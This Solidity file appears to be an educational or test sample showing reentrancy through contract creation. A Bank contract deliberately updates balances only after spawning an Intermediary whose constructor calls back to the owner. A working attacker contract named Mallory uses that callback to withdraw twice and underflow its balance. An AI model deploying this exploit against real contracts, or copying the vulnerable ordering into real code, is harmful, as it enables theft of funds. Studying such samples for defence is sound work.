pragma solidity 0.5;
/*pragma solidity ^0.4.21;*/

contract IntermediaryCallback {
    function registerIntermediary(address payable what) public payable;
    // for solidity 0.4.21
    /*function registerIntermediary(address what) public payable;*/
}

contract Intermediary {
    // this contract just holds the funds until the owner comes along and
    // withdraws them.

    address owner;
    Bank bank;
    uint amount;

    constructor(Bank _bank, address _owner, uint _amount) public {
    // for solidity 0.4.21
    /*function Intermediary(Bank _bank, address _owner, uint _amount) public {*/
        owner = _owner;
        bank = _bank;
        amount = _amount;

        // this contract wants to register itself with its new owner, so it
        // calls the new owner (i.e. the attacker). This passes control to an
        // untrusted third-party contract.
        IntermediaryCallback(_owner).registerIntermediary(address(this));
    }

    function withdraw() public {
        if (msg.sender == owner) {
            msg.sender.transfer(amount);
        }
    }
    
    function () payable external {}
}

contract Bank {
    mapping (address => uint) balances;
    mapping (address => Intermediary) subs;

    function getBalance(address a) public view returns(uint) {
        return balances[a];
    }

    function withdraw(uint amount) public {
        if (balances[msg.sender] >= amount) {
            // The new keyword creates a new contract (in this case of type
            // Intermediary). This is implemented on the EVM level with the CREATE
            // instruction. CREATE immediately runs the constructor of the
            // contract. i.e this must be seen as an external call to another
            // contract.
            // Even though the contract can be considered "trusted", it can
            // perform further problematic actions (e.g. more external calls)
            subs[msg.sender] = new Intermediary(this, msg.sender, amount);
            // state update **after** the CREATE
            balances[msg.sender] -= amount;
            address(subs[msg.sender]).transfer(amount);
        }
    }
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}

contract Mallory is IntermediaryCallback {
    Bank bank;
    uint state;
    Intermediary i1;
    Intermediary i2;

    function attack(Bank b, uint amount) public payable {
        state = 0;
        bank = b;
        // first deposit some ether
        bank.deposit.value(amount)();
        // then withdraw it again. This will create a new Intermediary contract, which
        // holds the funds until we retrieve it. This will trigger the
        // registerIntermediary callback.
        bank.withdraw(bank.getBalance(address(this)));
        // finally withdraw all the funds from our Intermediarys
        i1.withdraw();
        i2.withdraw();

        // note that bank.balances[this] has underflowed by now, so we will see
        // also a huge balances entry for the Mallory contract.
    }

    function registerIntermediary(address payable what) public payable {
    // for solidity 0.4.21
    /*function registerIntermediary(address what) public payable {*/
        // called by the newly created Intermediary contracts
        if (state == 0) {
            // we do not want to loop the re-entrancy until we run out of gas,
            // so we stop after the second withdrawal
            state = 1;
            // we keep track of the Intermediary, because it holds our funds
            i1 = Intermediary(what);
            // withdraw again - note that `bank.balances[this]` was not yet
            // updated.
            bank.withdraw(bank.getBalance(address(this)));
        } else if (state == 1) {
            state = 2;
            // this is the second Intermediary that holds funds for us
            i2 = Intermediary(what);
        } else {
            // ignore everything else
        }
    }

    function withdrawAll() public {
        i1.withdraw();
        i2.withdraw();
    }
    
    function () external payable {}
}
